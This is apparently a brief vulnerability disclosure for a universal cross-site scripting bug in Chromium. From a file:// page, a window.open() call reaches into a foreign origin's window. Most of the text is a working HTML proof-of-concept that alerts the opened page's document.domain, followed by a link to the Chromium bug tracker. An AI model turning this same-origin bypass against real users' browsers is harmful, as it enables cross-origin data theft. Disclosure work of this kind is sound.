# Security: UXSS via window.open() via file:// pages

<video src="./steps.mp4" />

Poc:
```html
<button onclick="fsBypass(document.documentElement);">click Here</button>
<script>
function fsBypass(element) {
  var x = window.open("http://abc.xyz");
  x.alert();
  setTimeout(function(){x.alert(x.document.domain);}, 70)
}
</script>
```

https://bugs.chromium.org/p/chromium/issues/detail?id=594383
